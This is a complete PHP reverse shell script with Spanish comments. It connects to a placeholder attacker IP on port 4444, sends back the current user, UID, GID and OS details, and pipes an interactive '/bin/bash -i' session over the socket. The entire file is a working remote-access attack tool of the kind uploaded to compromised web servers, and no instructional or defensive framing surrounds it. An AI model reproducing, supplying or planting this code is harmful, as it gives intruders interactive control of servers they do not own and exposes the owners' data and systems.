<?php
// Configuración
$ip = 'X.X.X.X';    // IP de escucha
$port = 4444;       // Puerto de escucha
$shell = '/bin/bash -i';
$chunk_size = 1024;
$debug = false;

// Configurar entorno
set_time_limit(0);
error_reporting(E_ALL & ~E_NOTICE);

function printit($msg) {
    global $debug;
    if ($debug) {
        echo "[DEBUG] $msg\n";
    }
}

// Auto-discovery del entorno
function discoverEnvironment($sock) {
    $info = [
        'User' => get_current_user(),
        'UID' => posix_getuid(),
        'GID' => posix_getgid(),
        'OS' => php_uname(),
        'Shell' => getenv("SHELL")
    ];
    $msg = "=== ENTORNO DETECTADO ===\n";
    foreach ($info as $key => $value) {
        $msg .= "$key: $value\n";
    }
    fwrite($sock, $msg . "\n");
}

// Reverse shell con stream_select
function startReverseShell($ip, $port, $shell, $chunk_size) {
    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) { die("ERROR: $errstr ($errno)\n"); }
    printit("Conexión establecida con $ip:$port");

    discoverEnvironment($sock);  // Mostrar entorno

    $descriptorspec = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w']
    ];

    $process = proc_open($shell, $descriptorspec, $pipes);
    if (!is_resource($process)) {
        die("ERROR: No se pudo iniciar el shell.\n");
    }

    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($sock, 0);

    while (true) {
        $read_a = [$sock, $pipes[1], $pipes[2]];
        $write_a = null;
        $error_a = null;

        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
        if ($num_changed_sockets === false) { break; }

        if (in_array($sock, $read_a)) {
            $input = fread($sock, $chunk_size);
            if ($input) { fwrite($pipes[0], $input); }
        }

        if (in_array($pipes[1], $read_a)) {
            $output = fread($pipes[1], $chunk_size);
            if ($output) { fwrite($sock, $output); }
        }

        if (in_array($pipes[2], $read_a)) {
            $output = fread($pipes[2], $chunk_size);
            if ($output) { fwrite($sock, $output); }
        }

        if (feof($sock)) { break; }
    }

    fclose($sock);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
}

startReverseShell($ip, $port, $shell, $chunk_size);
?>
